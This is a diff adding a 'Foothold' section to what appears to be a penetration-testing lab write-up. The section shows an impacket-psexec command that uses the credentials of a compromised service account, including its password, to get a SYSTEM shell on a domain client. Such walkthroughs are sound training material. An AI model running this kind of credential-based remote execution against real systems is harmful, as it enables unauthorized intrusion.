@@ -61,6 +61,16 @@ This machine is probably accessible with something from the compromised [`DC`](.
 
 ## Foothold
 
+Initial access is provided as `SYSTEM` by using the `SKYLARK\backup_service` credentials and `impacket-psexec`:
+
+{% code overflow="wrap" %}
+```bash
+rlwrap impacket-psexec SKYLARK/backup_service:'It4Server'@client01.skylark.com
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/SL-C01-SystemPsExec.png" alt=""><figcaption></figcaption></figure>
+
 
 
 ## Privilege Escalation
